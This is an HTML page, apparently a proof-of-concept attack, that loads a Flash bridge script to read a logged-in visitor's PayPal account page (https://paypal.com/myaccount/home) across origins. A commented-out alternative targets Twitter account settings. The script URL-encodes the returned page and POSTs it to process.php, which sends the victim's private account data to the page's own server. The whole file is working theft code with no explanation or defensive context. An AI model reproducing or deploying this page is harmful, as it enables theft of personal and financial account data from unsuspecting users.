<html>
<head>
 <meta charset="utf-8"/>
 <script src="flashhttprequest.js"></script>
 <script>
 // This function will be called when the Flash bridge has been loaded
 function onhook() {
 FlashHTTPRequest.open('GET', 'https://paypal.com/myaccount/home', '', 'post_receiver' );
 // FlashHTTPRequest.open('GET', 'https://twitter.com/settings/account', '', 'post_receiver' );
 }

 function post_receiver( response ) {
 var data = encodeURIComponent(response);
 //console.log( data );   
 //alert(data);

 var xmlhttp = new XMLHttpRequest();
 var url = "process.php";
 var params = "data=" + data;
 xmlhttp.open("POST", url, true);
 xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 xmlhttp.send(params); 
 //alert(xmlhttp.responseText);
}
 </script>
</head>
<body>
 <div id="flashBridge"></div>
</body>
</html>
